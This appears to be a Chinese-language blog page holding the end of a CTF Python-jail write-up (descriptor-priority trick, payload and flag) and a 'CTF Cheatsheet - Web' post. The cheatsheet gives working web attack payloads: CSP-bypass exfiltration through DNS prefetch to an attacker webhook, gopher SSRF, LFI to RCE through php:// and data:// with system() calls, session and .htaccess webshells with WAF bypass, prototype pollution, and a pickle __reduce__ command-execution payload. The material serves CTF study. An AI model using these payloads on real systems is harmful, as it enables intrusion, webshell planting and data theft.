<p><strong>所以我們可以先透過 <code>getattr(type,&quot;__subclasses__&quot;)</code> 取得 <code>type.__subclasses__</code> 再把 <code>__base__</code> 塞進去就可以得到 <code>type.__base__.__subclasses__()</code></strong></p>
<p>好到這邊大家應該已經搞懂上面那陀 <code>welcome_msg</code> 的 payload 到底在幹嘛了，簡單來說就是到 <code>object</code> 裡面把所有 class 抓出來，然後抓倒數第2個 <code>class</code> (<code>jail.Desc</code>)把它印出來</p>
<h3 id="解題"><a href="#解題" class="headerlink" title="解題"></a>解題</h3><p>一開始想改抓 <code>jail.Test</code> 下面的 <code>desc</code> 就可以拿到 <code>flag</code> 了<br>抓是抓得到，但是print不出來啊</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = Desc();a.desc_helper(<span class="string">&quot;__base__&quot;</span>);obj=a.helper;a = Desc();a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>);obj = a.helper(obj)[-<span class="number">1</span>].desc</span><br></pre></td></tr></table></figure>

<p>這邊又卡一個知識點了，那就是 <strong>python 的 descriptor 解析有優先度的問題</strong>(題目有提示describe，雖然我覺得沒有人看得懂)</p>
<p>以下參考 @Vincent550102 的筆記：</p>
<blockquote>
<ul>
<li>如果 __get__ 與 __set__ 都有，優先使用描述器（Descriptor）：<br>當一個描述器同時實現了 __get__ 和 __set__ 方法時，Python 會認為它是一個資料描述器（Data Descriptor）。資料描述器的一個特點是它們對屬性的訪問有更高的優先級。<br>如果不是，則在自己的 __dict__ 裡面找：</li>
<li>如果描述器沒有作為資料描述器或者只實現了 __get__ 方法的非資料描述器（Non-Data Descriptor）或者找不到描述器，Python 會繼續在物件的 __dict__ 屬性字典中尋找是否存在該屬性。</li>
<li>若在 __dict__ 也找不到，嘗試用描述器的 __get__：<br>如果在物件的 <strong>dict</strong> 中找不到該屬性，Python 會檢查是否存在只實現了 <strong>get</strong> 方法的非資料描述器，如果存在，則回傳該描述器的 __get__ 方法。<br>都沒有，直接回傳描述器：</li>
<li>如果上述步驟都無法找到該屬性，最後會返回描述器物件本身，如果連描述器也不存在，則會拋出 AttributeError。</li>
</ul>
</blockquote>
<p>看到這邊，問題已經變很簡單了，那就是<strong>我們需要將 <code>__get__</code> 變成最高優先級</strong>，此時後面就算 fake_flag 把 <code>test.desc</code> 蓋掉也沒有用，仍然會回傳 <code>Test.__get__()</code> 的內容</p>
<p>如何將 <code>__get__</code> 變成最高優先級呢？<strong>只要新增一個 <code>__set__</code> 就行了</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func = <span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span></span><br><span class="line">desc.__setattr__(<span class="string">&quot;__set__&quot;</span>,func)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">(a := Desc(),a.desc_helper(<span class="string">&quot;__base__&quot;</span>),obj:=a.helper,a := Desc(),a.desc_helper(<span class="string">&quot;__subclasses__&quot;</span>),desc:=a.helper(obj)[-<span class="number">2</span>],a:=Desc(),a.desc_helper(<span class="string">&quot;__setattr__&quot;</span>),func:=<span class="keyword">lambda</span> <span class="variable language_">self</span>,obj,val:<span class="literal">None</span>,a.helper(desc,<span class="string">&quot;__set__&quot;</span>,func))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>AIS3{y0u_kn0w_h0w_d35cr1p70r_w0rk!}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-04-30T07:11:21.000Z" title="2024/4/30 下午3:11:21">2024-04-30</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:45:03.908Z" title="2024/11/17 下午12:45:03">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Cheatsheet/">Cheatsheet</a></span><span class="level-item">14 分鐘讀完 (大約2126個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/04/30/CTF-Cheatsheet-Web/">CTF Cheatsheet - Web</a></p><div class="content"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Information-Leak"><a href="#Information-Leak" class="headerlink" title="Information Leak"></a>Information Leak</h2><h3 id="git-svn-bzr"><a href="#git-svn-bzr" class="headerlink" title=".git &#x2F; .svn &#x2F; .bzr"></a>.git &#x2F; .svn &#x2F; .bzr</h3><p>版本控制系統</p>
<p>.git洩漏可用scrabble將整個.git資料夾下載下來並用git 還原</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scrabble http://www.example.com/ </span><br></pre></td></tr></table></figure>

<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:www.example.com</span><br><span class="line">intext:<span class="string">&quot;管理介面&quot;</span></span><br><span class="line">filetype:sql</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">GHDB</a></p>
<p>robots.txt</p>
<p>.DS_Store</p>
<p>.index.php.swp</p>
<p>Backup file</p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">XSS Payload</a></p>
<h3 id="CSP-怎麼偷資料"><a href="#CSP-怎麼偷資料" class="headerlink" title="CSP 怎麼偷資料"></a>CSP 怎麼偷資料</h3><p>假設他 Content Security Policy 在亂寫一通的話，可以用 <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a> 檢查</p>
<p><code>CSP</code> 沒擋用什麼偷</p>
<p>例如 <code>CSP</code> 只有擋 <code>script</code> ，那就用 <code>&lt;img&gt;</code> 來偷</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src &#x27;none&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果把連線都擋掉的話，還是可以使用 <code>location.href</code> 或 <code>window.open()</code> 透過跳轉來偷資料</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &#x27;none&#x27;;script-src &#x27;unsafe-inline&#x27;;</span><br></pre></td></tr></table></figure>



<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>允許特定第三方網站引入時，可以嘗試使用 <code>JSONP</code> 引入惡意程式碼</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src https<span class="punctuation">:</span><span class="comment">//example.com</span></span><br></pre></td></tr></table></figure>


<p><a target="_blank" rel="noopener" href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee</a></p>
<h4 id="DNS-prefetch"><a href="#DNS-prefetch" class="headerlink" title="DNS prefetch"></a>DNS prefetch</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">dns-prefetch</span> <span class="attr">href</span>=<span class="string">[YOUR_DATA].webhook.trianglesnake.com</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">  <span class="string">&quot;iceServers&quot;</span>:[</span><br><span class="line">      &#123;<span class="string">&quot;urls&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;turn:74.125.140.127:19305?transport=udp&quot;</span></span><br><span class="line">       ],<span class="string">&quot;username&quot;</span>:<span class="string">&quot;_all_your_data_belongs_to_us&quot;</span>,</span><br><span class="line">      <span class="string">&quot;credential&quot;</span>:<span class="string">&quot;.&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">pc.<span class="title function_">createOffer</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">sdp</span>)=&gt;</span>pc.<span class="title function_">setLocalDescription</span>(sdp);</span><br></pre></td></tr></table></figure>


<h2 id="PHP-弱型別判斷"><a href="#PHP-弱型別判斷" class="headerlink" title="PHP 弱型別判斷"></a>PHP 弱型別判斷</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/1.png" alt="https://i.stack.imgur.com/giVhE.png"></p>
<p><a target="_blank" rel="noopener" href="https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/211902/">PHP弱型別的安全問題詳細總結</a></p>
<h3 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5()&amp;sha1()"></a>md5()&amp;sha1()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="keyword">array</span>()) ==<span class="title function_ invoke__">sha1</span>(<span class="keyword">array</span>())<span class="comment">//true=&gt;error=error</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>)==<span class="number">0</span> <span class="comment">//true</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">md5(240610708)=&gt;&#x27;0e462097431906509019562988736854&#x27;</span></span><br><span class="line"><span class="comment">在弱型別判斷中會做為科學記號和int比較</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aa3OFF9m&#x27;</span>)=&gt;<span class="string">&#x27;0e36977786278517984959260394024281014729&#x27;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shijiahao/p/12638484.html">https://www.cnblogs.com/shijiahao/p/12638484.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9">https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9</a></p>
<h2 id="header竄改"><a href="#header竄改" class="headerlink" title="header竄改"></a>header竄改</h2><h3 id="可偽造ip相關"><a href="#可偽造ip相關" class="headerlink" title="可偽造ip相關"></a>可偽造ip相關</h3><ul>
<li><code>X-Forward-For</code></li>
<li><code>Client-IP</code></li>
<li><code>X-Real-IP</code></li>
</ul>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="gopher-用法"><a href="#gopher-用法" class="headerlink" title="gopher 用法"></a>gopher 用法</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gopher</span>:<span class="comment">//host:port/_HTTPRequest</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//example POST request:</span></span><br><span class="line"></span><br><span class="line">*<span class="attr">gopher</span>:<span class="comment">//192.168.0.1:8888/_POST/index.php?action=login HTTP/1.1</span></span><br><span class="line"><span class="title class_">Host</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1000</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="attr">type</span>:application/x-www-form-urlencoded</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>:<span class="number">20</span></span><br><span class="line"></span><br><span class="line">username=admin&amp;password=bupt666</span><br><span class="line"><span class="comment">//換行要用%0D%0A(\r\n)*</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><em>備註：發起POST的四個必要欄位</em><br>POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1<br>host:192.168.0.109<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>Content-Length:11</p>
</blockquote>
<p>gopher POST request payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20localhost%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%207%0d%0A%0d%0afoo=bar%0d%0A</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https:&#x2F;&#x2F;hackmd.io&#x2F;@Lhaihai&#x2F;H1B8PJ9hX</a></p>
<hr>
<h2 id="LFI-RFI"><a href="#LFI-RFI" class="headerlink" title="LFI&amp;RFI"></a>LFI&amp;RFI</h2><h3 id="php-require-include"><a href="#php-require-include" class="headerlink" title="php require()&amp;include()"></a>php require()&amp;include()</h3><h4 id="偽協議"><a href="#偽協議" class="headerlink" title="偽協議"></a><strong>偽協議</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpfilter</span></span><br><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=target.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phar 打包成zip下載</span></span><br><span class="line">index.php?file=phar:<span class="comment">//test.zip/target.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//data:URL schema</span></span><br><span class="line">index.php?file=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=data:text/plain;base64,**PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==**</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/384080/">data:URL schema更多用法</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#敏感檔案</span></span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line"></span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line"></span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line"></span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line"></span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>

<h3 id="SESSION植入WebShell"><a href="#SESSION植入WebShell" class="headerlink" title="SESSION植入WebShell"></a><strong>SESSION植入WebShell</strong></h3><p>若session可寫入，可以利用LFI執行php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">寫入<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">index.php?file=/&lt;sess_path&gt;/sess_&lt;your session&gt;</span><br></pre></td></tr></table></figure>

<p>session_path可由phpinfo內找到session.save_path，若無則放在&#x2F;tmp內</p>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</p>
<p>session檔名為sess_&lt;session id&gt;</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">freebuf-LFI</a></p>
<hr>
<h2 id="JS-prototype-pollution"><a href="#JS-prototype-pollution" class="headerlink" title="JS prototype pollution"></a>JS prototype pollution</h2><p><a target="_blank" rel="noopener" href="https://github.com/aszx87410/blog/issues/88">基於 JS 原型鏈的攻擊手法：Prototype Pollution</a></p>
<p>當javascript在呼叫內建函式時，會透過prototype找上一層要呼叫的函式(因為內建函式並沒有真正在乎叫的物件之中)<br>舉例來說:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lst = [<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lst.<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure>
<p><code>toString()</code>不可能每個宣告的Array Object都有toString()，當呼叫時必須透過prototype找到上一層然後呼叫<code>Array.toString</code></p>
<p>所以其實在呼叫<code>lst.toString()</code>的時候其實是呼叫了<code>Array.prototype.toString()</code></p>
<p>而哪些<code>object</code>的prototype是甚麼則定義在object的__proto__裡面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lst.<span class="property">__proto__</span>.<span class="property">toString</span> == <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>因此，在一些情況下，有些功能可能造成prototype可以被竄改，進而導致prototype pollution</p>
<h3 id="parse-query"><a href="#parse-query" class="headerlink" title="parse query"></a>parse query</h3><p>在對於Array進行賦值的時候，攻擊者可以透過構造key為<code>__proto__</code>達到prototype pollution</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parseQuery function回傳一個parsed的dict</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseQuery</span>(<span class="params">queryString</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> params = &#123;&#125;;</span><br><span class="line">  queryString.<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">param</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> [key, value] = param.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    params[key] = value;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Example usage</span></span><br><span class="line"><span class="keyword">const</span> userInput = <span class="string">&#x27;user=admin&amp;isAdmin=true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parsing user input</span></span><br><span class="line"><span class="keyword">const</span> parsedQuery = <span class="title function_">parseQuery</span>(userInput);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsedQuery);  <span class="comment">// Output: &#123; user: &#x27;admin&#x27;, isAdmin: &#x27;true&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 透過prototype pollution把驗證機制竄改掉，繞過檢查機制</span></span><br><span class="line"><span class="title function_">parseQuery</span>(<span class="string">&#x27;user=admin&amp;isAdmin=true&amp;__proto__.isAdmin=true&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// isAdmin被竄改，return true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">isAdmin</span>);  <span class="comment">// Output: true</span></span><br></pre></td></tr></table></figure>
<h3 id="合併物件"><a href="#合併物件" class="headerlink" title="合併物件"></a>合併物件</h3><p>合併物件同樣有可能發生</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> a[prop] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[prop], b[prop])</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[prop] = b[prop]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">c</span>: <span class="number">2</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> customConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: 1&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(config, customConfig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">isAdmin</span>)</span><br></pre></td></tr></table></figure>

<p>不難看出，其實只要有對Object的key和value進行操作，就很有可能導致prototype pollution</p>
<hr>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>可影響apache伺服器中資料夾內的檔案</p>
<p><strong>利用指定404、403等錯誤響應文件達成LFI</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument <span class="number">404</span> /flag.txt</span><br><span class="line">ErrorDocument <span class="number">404</span> /shell.php</span><br></pre></td></tr></table></figure>

<p><strong>強制解析非php檔案造成RCE</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt</span><br></pre></td></tr></table></figure>

<p><strong>將.htaccess本身作為php執行後門</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>#為.htaccess的註解符號</p>
<p><strong>若有WAF則可用\換行繞過</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p\</span><br><span class="line">hp_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?=echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></span><br></pre></td></tr></table></figure>


<p>遇到\時，會接續下一行</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
<h2 id="Serialize-Deserialize"><a href="#Serialize-Deserialize" class="headerlink" title="Serialize&amp;Deserialize"></a>Serialize&amp;Deserialize</h2><p>呼叫反序列化時，可能呼叫一些Magic Method</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><table>
<thead>
<tr>
<th>Value</th>
<th>Serialize(PHP)</th>
</tr>
</thead>
<tbody><tr>
<td>8459302</td>
<td>i:8459302;</td>
</tr>
<tr>
<td>TRUE</td>
<td>b:1;</td>
</tr>
<tr>
<td>NULL</td>
<td>N;</td>
</tr>
<tr>
<td>[’x’,1]</td>
<td>a:2:{i:0;s:1:”x”;i:1;i:1;}</td>
</tr>
</tbody></table>
<p><strong>PHP Object的序列化</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;kitten&quot;</span>) =&gt;O:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;kitten&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;  =&gt;&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;.....&#125;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$b</span>; =&gt;&#123;s:<span class="number">6</span>:<span class="string">&quot;\x00Cat\x00b&quot;</span>;.....&#125;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$c</span>; =&gt;&#123;s:<span class="number">4</span>:<span class="string">&quot;\x00*\x00c&quot;</span>;.....&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP Magic Method</span><br><span class="line">在指定時機自動呼叫magic method</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//Object 被銷毀或garbage collection</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//unserialize時觸發</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//被呼叫不存在方法時觸發</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//被當成string處理時觸發(如 echo)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">**Python Pickle**</span><br><span class="line">pickle.dumps()會將資料序列化</span><br><span class="line">可寫payloads</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output,([<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;/flag_5fb2acebf1d0c558&#x27;</span>],))</span><br><span class="line">再想辦法把payload()塞進dumps裡面</span><br></pre></td></tr></table></figure>

<h3 id="Phar與反序列化"><a href="#Phar與反序列化" class="headerlink" title="Phar與反序列化"></a>Phar與反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="SSTI-Server-Side-Template-Injection"><a href="#SSTI-Server-Side-Template-Injection" class="headerlink" title="SSTI(Server Side Template Injection)"></a>SSTI(Server Side Template Injection)</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/2.png"></p>
<p>python Flask預設模板為Jinja2</p>
